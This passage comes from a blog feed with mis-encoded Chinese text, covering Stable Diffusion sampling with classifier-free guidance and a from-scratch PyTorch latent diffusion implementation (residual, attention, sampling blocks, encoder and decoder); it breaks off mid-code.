ç›´æ¥check vaeçš„downsampleæ•°,ç„¶åå¯¹ç»´åº¦ç›´æ¥è¿›è¡Œè°ƒæ•´,ç”Ÿæˆlatent spaceçš„random input.</p><p>ç„¶åuneté‡Œé¢ä¼ å…¥text embeddingä½œä¸ºhidden state. ç„¶åè¿™é‡Œguidanceæˆ‘ä¸æ˜¯å¾ˆç†è§£,å¤§æ¦‚æ˜¯uneté»˜è®¤åŒæ—¶ä¼ å‡ºconditionalå’Œunconditionalçš„result,ç„¶åè¿™é‡Œæ‰‹åŠ¨åšè°ƒæ•´?</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> tqdm.auto <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line"><span class="comment"># image settings</span></span><br><span class="line">height = <span class="number">512</span>  <span class="comment"># default height of Stable Diffusion</span></span><br><span class="line">width = <span class="number">512</span>  <span class="comment"># default width of Stable Diffusion</span></span><br><span class="line">num_inference_steps = <span class="number">25</span>  <span class="comment"># Number of denoising steps</span></span><br><span class="line">guidance_scale = <span class="number">7.5</span>  <span class="comment"># Scale for classifier-free guidance</span></span><br><span class="line">generator = torch.cuda.manual_seed(<span class="number">0</span>)  <span class="comment"># Seed generator to create the initial latent noise</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># latent noice</span></span><br><span class="line"><span class="comment"># 2 ** (len(vae.config.block_out_channels) - 1) == 8</span></span><br><span class="line">latents = torch.randn(</span><br><span class="line">    (batch_size, unet.config.in_channels, height // <span class="number">8</span>, width // <span class="number">8</span>),</span><br><span class="line">    generator=generator,</span><br><span class="line">    device=torch_device,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># scaling input with the noice distribution</span></span><br><span class="line">latents = latents * scheduler.init_noise_sigma</span><br><span class="line">scheduler.set_timesteps(num_inference_steps)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> tqdm(scheduler.timesteps):</span><br><span class="line">    <span class="comment"># expand the latents if we are doing classifier-free guidance to avoid doing two forward passes.</span></span><br><span class="line">    latent_model_input = torch.cat([latents] * <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    latent_model_input = scheduler.scale_model_input(latent_model_input, timestep=t)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># predict the noise residual</span></span><br><span class="line">    <span class="keyword">with</span> torch.no_grad():</span><br><span class="line">        noise_pred = unet(latent_model_input, t, encoder_hidden_states=text_embeddings).sample</span><br><span class="line"></span><br><span class="line">    <span class="comment"># perform guidance</span></span><br><span class="line">    noise_pred_uncond, noise_pred_text = noise_pred.chunk(<span class="number">2</span>)</span><br><span class="line">    noise_pred = noise_pred_uncond + guidance_scale * (noise_pred_text - noise_pred_uncond)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># compute the previous noisy sample x_t -&gt; x_t-1</span></span><br><span class="line">    latents = scheduler.step(noise_pred, t, latents).prev_sample</span><br></pre></td></tr></table></figure><h3 id="show-result">show result</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">latents = <span class="number">1</span> / <span class="number">0.18215</span> * latents</span><br><span class="line"><span class="keyword">with</span> torch.no_grad():</span><br><span class="line">    image = vae.decode(latents).sample</span><br><span class="line">image = (image / <span class="number">2</span> + <span class="number">0.5</span>).clamp(<span class="number">0</span>, <span class="number">1</span>).squeeze()</span><br><span class="line">image = (image.permute(<span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>) * <span class="number">255</span>).to(torch.uint8).cpu().numpy()</span><br><span class="line">image = Image.fromarray(image)</span><br><span class="line">image</span><br></pre></td></tr></table></figure><p><img src="bowl_of_cats.png" /></p>]]></content>
      
      
      <categories>
          
          <category> ML </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ä»é›¶å®ç°LDM(1)</title>
      <link href="/2024/04/20/%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0LDM-1/"/>
      <url>/2024/04/20/%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0LDM-1/</url>
      
        <content type="html"><![CDATA[<p>ä»£ç ä¸»è¦è¿˜æ˜¯æ¥è‡ªä¸¤ä¸ªrepo <a href="https://github.com/CompVis/latent-diffusion/">CompVis</a>å’Œ<a href="https://github.com/dome272/VQGAN-pytorch">outlier</a></p><p>ç¬¬äºŒä¸ªäººæ˜¯ä¸€ä¸ªæ²¹ç®¡ä½œè€…,è§†é¢‘è®²è§£å¾ˆæ¸…æ¥š,é‡åˆ°å„ç§é—®é¢˜ä¹Ÿå¯ä»¥ä»å®˜æ–¹æˆ–è€…outlierçš„ä»£ç é‡Œé¢æ‰¾åˆ°é—®é¢˜,ä¸è¿‡å…·ä½“å®ç°å’Œå…‰çœ‹è®ºæ–‡è¿˜æ˜¯æœ‰ä¸€äº›åŒºåˆ«.</p><p>è¿™æ¬¡ä»é›¶å®ç°LDMæ˜¯ä»¥å­¦ä¹ ä¸ºç›®çš„,ä¸€å®šè¦è¯´çš„è¯<strong>ç¡®å®æ˜¯é€ è½®å­</strong>,éœ€è¦æˆå“ç›´æ¥å»å®˜æ–¹æ¬å°±è¡Œäº†. å®˜æ–¹æ–‡æ¡£å†™çš„ä¹ŸæŒºæ¸…æ¥šçš„äº†.</p><p><a href="https://github.com/blacsheep/ldm-pytorch">github repoåœ°å€</a></p><h2 id="vqæ„æˆ">VQæ„æˆ</h2><h3 id="residualå±‚">Residualå±‚</h3><p>d2lçš„æ®‹å·®å—, åç»­encoderçš„decoderé‡Œé¢ä¼šç”¨åˆ°. æ®‹å·®å—çš„æ€è·¯éƒ½æ˜¯ä¸€æ ·çš„,åœ¨æ ¸å¿ƒéƒ¨åˆ†ä¹Ÿåªæ˜¯å¡«å……ä½œç”¨,ä¸å¤šåšè§£é‡Š.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># https://zh.d2l.ai/chapter_convolutional-modern/resnet.html</span></span><br><span class="line"><span class="comment"># the most basic ResNet structure</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Residual</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, input_channels, num_channels,</span></span><br><span class="line"><span class="params">                 use_1x1conv=<span class="literal">False</span>, strides=<span class="number">1</span></span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        self.conv1 = nn.Conv2d(input_channels, num_channels,</span><br><span class="line">                               kernel_size=<span class="number">3</span>, padding=<span class="number">1</span>, stride=strides)</span><br><span class="line">        self.conv2 = nn.Conv2d(num_channels, num_channels,</span><br><span class="line">                               kernel_size=<span class="number">3</span>, padding=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> use_1x1conv:</span><br><span class="line">            self.conv3 = nn.Conv2d(input_channels, num_channels,</span><br><span class="line">                                   kernel_size=<span class="number">1</span>, stride=strides)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.conv3 = <span class="literal">None</span></span><br><span class="line">        self.bn1 = nn.BatchNorm2d(num_channels)</span><br><span class="line">        self.bn2 = nn.BatchNorm2d(num_channels)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, X</span>):</span><br><span class="line">        Y = F.relu(self.bn1(self.conv1(X)))</span><br><span class="line">        Y = self.bn2(self.conv2(Y))</span><br><span class="line">        <span class="keyword">if</span> self.conv3:</span><br><span class="line">            X = self.conv3(X)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> X.shape != Y.shape:</span><br><span class="line">            <span class="keyword">return</span> F.relu(Y)</span><br><span class="line">        Y += X</span><br><span class="line">        <span class="keyword">return</span> F.relu(Y)</span><br></pre></td></tr></table></figure><h3 id="attentionå±‚">Attentionå±‚</h3><p>CVçš„attentionå­˜åœ¨ä¸¤ç§,ä¸€ç§Spatial SelfAttention,ä¸€ç§Channel SelfAttention.</p><p>å‡è®¾å›¾ç‰‡ç»´åº¦ä¸ºHxWxC</p><p>Spatialçš„åšæ³•æ˜¯1x1å·ç§¯å±‚è¿æ¥æ‰€æœ‰é€šé“ä¿¡æ¯æ„æˆæ–°å›¾HxWx1,ç„¶åå¯¹è¿™ä¸ªæ–°å›¾åšSelfAttention, ä¾§é‡ç‚¹åœ¨äºå¯¹å›¾åƒçš„å¹³é¢ç»´åº¦åšæƒé‡.</p><p>Channelçš„åšæ³•æ˜¯é¦–å…ˆmxnçš„poolå±‚å°†ä¿¡æ¯æ•´åˆåˆ°1x1xC,ç„¶åå¯¹æ‰€æœ‰çš„é€šé“åšæƒé‡,ä¾§é‡ç‚¹åœ¨äºé€šé“.</p><p>è¿™é‡Œæˆ‘ä»¬ç”¨çš„æ˜¯Spatial Attention.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">SelfAttention</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, in_channels</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        self.in_channels = in_channels</span><br><span class="line"></span><br><span class="line">        self.norm = torch.nn.GroupNorm(num_groups=<span class="number">32</span>, num_channels=in_channels, eps=<span class="number">1e-6</span>, affine=<span class="literal">True</span>)</span><br><span class="line">        <span class="comment"># 1x1 conv -&gt; spatial attention</span></span><br><span class="line">        self.q = torch.nn.Conv2d(in_channels,</span><br><span class="line">                                 in_channels,</span><br><span class="line">                                 kernel_size=<span class="number">1</span>,</span><br><span class="line">                                 stride=<span class="number">1</span>,</span><br><span class="line">                                 padding=<span class="number">0</span>)</span><br><span class="line">        self.k = torch.nn.Conv2d(in_channels,</span><br><span class="line">                                 in_channels,</span><br><span class="line">                                 kernel_size=<span class="number">1</span>,</span><br><span class="line">                                 stride=<span class="number">1</span>,</span><br><span class="line">                                 padding=<span class="number">0</span>)</span><br><span class="line">        self.v = torch.nn.Conv2d(in_channels,</span><br><span class="line">                                 in_channels,</span><br><span class="line">                                 kernel_size=<span class="number">1</span>,</span><br><span class="line">                                 stride=<span class="number">1</span>,</span><br><span class="line">                                 padding=<span class="number">0</span>)</span><br><span class="line">        self.proj_out = torch.nn.Conv2d(in_channels,</span><br><span class="line">                                        in_channels,</span><br><span class="line">                                        kernel_size=<span class="number">1</span>,</span><br><span class="line">                                        stride=<span class="number">1</span>,</span><br><span class="line">                                        padding=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        h_ = x</span><br><span class="line">        h_ = self.norm(h_)</span><br><span class="line">        q = self.q(h_)</span><br><span class="line">        k = self.k(h_)</span><br><span class="line">        v = self.v(h_)</span><br><span class="line">        <span class="comment"># compute attention</span></span><br><span class="line">        b, c, h, w = q.shape</span><br><span class="line">        q = q.reshape(b, c, h * w)</span><br><span class="line">        q = q.permute(<span class="number">0</span>, <span class="number">2</span>, <span class="number">1</span>)  <span class="comment"># b,hw,c</span></span><br><span class="line">        k = k.reshape(b, c, h * w)  <span class="comment"># b,c,hw</span></span><br><span class="line">        w_ = torch.bmm(q, k)  <span class="comment"># b,hw,hw    w[b,i,j]=sum_c q[b,i,c]k[b,c,j]</span></span><br><span class="line">        w_ = w_ * (<span class="built_in">int</span>(c) ** (-<span class="number">0.5</span>))</span><br><span class="line">        w_ = torch.nn.functional.softmax(w_, dim=<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># attend to values</span></span><br><span class="line">        v = v.reshape(b, c, h * w)</span><br><span class="line">        w_ = w_.permute(<span class="number">0</span>, <span class="number">2</span>, <span class="number">1</span>)  <span class="comment"># b,hw,hw (first hw of k, second of q)</span></span><br><span class="line">        h_ = torch.bmm(v, w_)  <span class="comment"># b, c,hw (hw of q) h_[b,c,j] = sum_i v[b,c,i] w_[b,i,j]</span></span><br><span class="line">        h_ = h_.reshape(b, c, h, w)</span><br><span class="line"></span><br><span class="line">        h_ = self.proj_out(h_)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> x + h_</span><br></pre></td></tr></table></figure><h3 id="upsample-å’Œ-downsample">UpSample å’Œ DownSample</h3><p>encoderä¼šå¢åŠ è¾“å…¥çš„é€šé“æ•°:æ¯”å¦‚æŠŠ3é€šé“å˜æˆ128. ç„¶åä¾æ®æˆ‘ä»¬æä¾›çš„Down Sampling Factor $ f $, æ¯æ¬¡æˆ‘ä»¬é€šé“æ•°ä¹˜ä»¥2,å®½é«˜é™¤ä»¥äºŒ. è¿™é‡Œçš„encodeå®½é«˜é™¤ä»¥2æˆ–è€…decodeå®½é«˜ä¹˜2çš„éƒ¨åˆ†å°±æ˜¯è¿™å‡ ä¸ªblockåšçš„.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">UpSampleBlock</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, channels</span>):</span><br><span class="line">        <span class="built_in">super</span>(UpSampleBlock, self).__init__()</span><br><span class="line">        self.conv = nn.Conv2d(channels, channels, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        x = F.interpolate(x, scale_factor=<span class="number">2.0</span>)</span><br><span class="line">        <span class="keyword">return</span> self.conv(x)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DownSampleBlock</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, channels</span>):</span><br><span class="line">        <span class="built_in">super</span>(DownSampleBlock, self).__init__()</span><br><span class="line">        self.conv = nn.Conv2d(channels, channels, <span class="number">3</span>, <span class="number">2</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        pad = (<span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">        x = F.pad(x, pad, mode=<span class="string">&quot;constant&quot;</span>, value=<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> self.conv(x)</span><br></pre></td></tr></table></figure><h3 id="encoder-decoder">Encoder, Decoder</h3><p>æ ¸å¿ƒéƒ¨åˆ†.</p><p>Encoderå·¥ä½œæµç¨‹: è¾“å…¥é€šé“ä»3å˜æˆè§„å®šå¤§å°, ç„¶åè¿›è¡Œå®½é«˜å‹ç¼©ä»¥åŠæ®‹å·®å—çš„è¿æ¥, åœ¨åˆé€‚çš„resolutionåŠ å…¥selfattention.</p><p>Decoderå·¥ä½œæµç¨‹: é¦–å…ˆä½¿ç”¨encoderçš„ç»“å°¾æ“ä½œçš„é€†æ“ä½œ(æ¯”å¦‚encoderæœ«å°¾è¿˜ä¼šæœ‰ResBlockå’ŒAttentionBlock),ç„¶ååšupsamplingå’Œæ®‹å·®å—æ³¨æ„åŠ›å—è¿æ¥,æœ€åè¾“å‡ºé€šé“ä»è§„å®šå¤§å°å˜æˆ3.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">Normalize</span>(<span class="params">in_channels, num_groups=<span class="number">32</span></span>):</span><br><span class="line">    <span class="keyword">return</span> torch.nn.GroupNorm(num_groups=num_groups, num_channels=in_channels, eps=<span class="number">1e-6</span>, affine=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Encoder</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, input_channels, number_res, f=<span class="number">8</span>, attn_res=<span class="number">32</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Initialize the class with the given input channels, number of residuals, and down sampling factor f.</span></span><br><span class="line"><span class="string">        Parameters:</span></span><br><span class="line"><span class="string">            input_channels (int): The number of input channels.</span></span><br><span class="line"><span class="string">            number_res (int): The number of residuals.</span></span><br><span class="line"><span class="string">            f (int, optional): Down sampling factor with a default value of 8.</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        self.input_channels = input_channels</span><br><span class="line">        self.output_channels = input_channels // f</span><br><span class="line">        self.level = math.log2(f)</span><br><span class="line">        <span class="keyword">if</span> self.level != <span class="built_in">int</span>(self.level):</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&#x27;Down Sampling factor Wrong!&#x27;</span>)</span><br><span class="line">        self.level = <span class="built_in">int</span>(self.level)</span><br><span class="line">        self.block = nn.ModuleList()</span><br><span class="line"></span><br><span class="line">        self.rgb2input_channel = nn.Conv2d(<span class="number">3</span>, input_channels, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">        self.block.append(self.rgb2input_channel)</span><br><span class="line">        <span class="comment"># down sampling</span></span><br><span class="line">        <span class="comment"># æ¯ä¸€ä¸ªlevelç»´åº¦é™¤ä»¥2</span></span><br><span class="line">        curr_output = self.input_channels</span><br><span class="line">        <span class="keyword">for</span> i_level <span class="keyword">in</span> <span class="built_in">range</span>(self.level):</span><br><span class="line">            curr_f = <span class="number">2</span> ** i_level</span><br><span class="line">            curr_input = self.input_channels // curr_f</span><br><span class="line">            curr_output = curr_input // <span class="number">2</span></span><br><span class="line">            self.res_sequence = nn.ModuleList()</span><br><span class="line">            <span class="comment"># æ¯æ¬¡é™¤ä»¥2è¿æ¥n_resä¸ªæ®‹å·®å—</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(number_res):</span><br><span class="line">                <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">                    self.res_sequence.append(Residual(curr_input, curr_output))</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    self.res_sequence.append(Residual(curr_output, curr_output))</span><br><span class="line">                <span class="comment"># self-attention æ”¶å°¾</span></span><br><span class="line">                <span class="keyword">if</span> curr_output == attn_res:</span><br><span class="line">                    self.attn = SelfAttention(curr_output)</span><br><span class="line">                    self.res_sequence.append(self.attn)</span><br><span class="line"></span><br><span class="line">            self.block.append(nn.Sequential(*self.res_sequence))</span><br><span class="line">            <span class="keyword">if</span> i_level != self.level - <span class="number">1</span>:</span><br><span class="line">                self.block.append(DownSampleBlock(curr_output))</span><br><span class="line">        <span class="comment"># mid</span></span><br><span class="line">        self.mid = nn.ModuleList()</span><br><span class="line">        self.mid.append(Residual(curr_output, curr_output))</span><br><span class="line">        self.mid.append(SelfAttention(curr_output))</span><br><span class="line">        self.mid.append(Residual(curr_output, curr_output))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># end</span></span><br><span class="line">        self.end = nn.ModuleList()</span><br><span class="line">        self.end.append(Normalize(curr_output))</span><br><span class="line">        self.conv_out = torch.nn.Conv2d(curr_output, curr_output,</span><br><span class="line">                                        kernel_size=<span class="number">3</span>,</span><br><span class="line">                                        stride=<span class="number">1</span>,</span><br><span class="line">                                        padding=<span class="number">1</span>)</span><br><span class="line">        self.end.append(self.conv_out)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        <span class="keyword">for</span> layer <span class="keyword">in</span> self.block:</span><br><span class="line">            x = layer(x)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> layer <span class="keyword">in</span> self.mid:</span><br><span class="line">            x = layer(x)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> layer <span class="keyword">in</span> self.end:</span><br><span class="line">            x = layer(x)</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Decoder</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, input_channels, number_res, f=<span class="number">8</span>, attn_res=<span class="number">32</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Initialize the class with the given input channels, number of residuals, and down sampling factor f.</span></span><br><span class="line"><span class="string">        Parameters:</span></span><br><span class="line"><span class="string">            input_channels (int): The number of input channels.</span></span><br><span class="line"><span class="string">            number_res (int): The number of residuals.</span></span><br><span class="line"><span class="string">            f (int, optional): Down sampling factor with a default value of 8.</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        self.input_channels = input_channels</span><br><span class="line">        self.output_channels = input_channels // f</span><br><span class="line">        self.level = math.log2(f)</span><br><span class="line">        <span class="keyword">if</span> self.level != <span class="built_in">int</span>(self.level):</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&#x27;Down Sampling factor Wrong!&#x27;</span>)</span><br><span class="line">        self.level = <span class="built_in">int</span>(self.level)</span><br><span class="line">        self.block = nn.ModuleList()</span><br><span class="line">        <span class="comment"># æ¯ä¸€ä¸ªlevelç»´åº¦é™¤ä»¥2</span></span><br><span class="line">        curr_output = self.output_channels</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># mid</span></span><br><span class="line">        self.mid = nn.ModuleList()</span><br><span class="line">        self.mid.append(Residual(curr_output, curr_output))</span><br><span class="line">        self.mid.append(SelfAttention(curr_output))</span><br><span class="line">        self.mid.append(Residual(curr_output, curr_output))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># upsampling</span></span><br><span class="line">        <span class="keyword">for</span> i_level <span class="keyword">in</span> <span class="built_in">range</span>(self.level):</span><br><span class="line">            curr_f = <span class="number">2</span> ** i_level</span><br><span class="line">            curr_input = self.output_channels * curr_f</span><br><span class="line">            curr_output = curr_input * <span class="number">2</span></span><br><span class="line">            self.res_sequence = nn.ModuleList()</span><br><span class="line">            <span class="comment"># æ¯æ¬¡é™¤ä»¥2è¿æ¥n_resä¸ªæ®‹å·®å—</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(number_res):</span><br><span class="line">                <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">                    self.res_sequence.append(Residual(curr_input, curr_output))</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    self.res_sequence.append(Residual(curr_output, curr_output))</span><br><span class="line">                <span class="comment"># self-attention æ”¶å°¾</span></span><br><span class="line">                <span class="keyword">if</span> curr_output == attn_res:</span><br><span class="line">                    self.attn = SelfAttention(curr_output)</span><br><span class="line">                    self.res_sequence.append(self.attn)</span><br><span class="line">            self.block.append(nn.Sequential(*self.res_sequence))</span><br><span class="line">            <span class="keyword">if</span> i_level != self.level - <span class="number">1</span>:</span><br><span class="line">                self.block.append(UpSampleBlock(curr_output))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># end</span></span><br><span class="line">        self.end = nn.ModuleList()</span><br><span class="line">        self.end.append(Normalize(curr_output))</span><br><span class="line">        self.conv_out = torch.nn.Conv2d(curr_output, curr_output,</span><br><span class="line">                                        kernel_size=<span 